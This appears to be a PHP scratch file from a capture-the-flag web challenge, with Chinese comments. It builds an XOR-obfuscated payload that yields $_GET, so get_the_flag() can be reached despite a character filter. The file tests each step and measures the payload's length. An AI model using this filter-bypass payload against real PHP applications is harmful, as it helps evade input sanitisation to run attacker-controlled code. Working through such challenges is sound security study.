<?php
// 测试 payload 构造
// $:>) ^ {}{} = _GET

// 在 PHP 中，字符串异或可以这样写：
// ("$:>)"^"{}{}") = "_GET"

// 所以我们可以构造：
// ${("$:>)"^"{}{}")} = $_GET

// 测试
$s = "$:>)" ^ "{}{}";
echo "Result: $s\n";

// 构造完整的 payload
// 目标：调用 get_the_flag()
// 方法：${("_GET")[0]} 获取参数

// 但我们需要更短的方式
// ${"$:>)"^"{}{}"} 这样可以直接获取 $_GET

// 测试
$_GET['a'] = 'test';
$v = "${"$:>)"^"{}{}"}";
echo "v: $v\n";  // 应该是 Array

// 不对，需要用 ${} 的正确语法
// ${"_GET"} 是访问 $_GET 变量

// 正确的写法：
// ${"$:>)"^"{}{}"} 应该等于 $_GET

// 但问题是 {} 在字符串中需要转义或用其他方式

// 让我测试另一种方式
// 在 PHP 中，可以用 ('str1'^'str2') 来异或
// 然后 ${('str1'^'str2')} 来访问变量

// 测试
$a = ('$:>)'^'{}{}');
echo "a: $a\n";

// 构造 payload
// ${('$:>)'^'{}{}')} 这样可以吗？
// 不行，因为 $ 在字符串中会被解析

// 需要用单引号
// ${('$:>)'^'{}{}')} 不对，单引号被禁止

// 用括号
// (('$:>)'^'{}{}')) 这样得到 _GET 字符串
// 然后用 ${...} 来访问

// 测试
$_GET['test'] = 'hello';
$result = ${('$:>)'^'{}{}')};
echo "result: "; print_r($result);

// 检查长度
$payload = '${(\'$:>)\'^\'{}{}\')}';
echo "Payload: $payload\n";
echo "Length: " . strlen($payload) . "\n";
?>
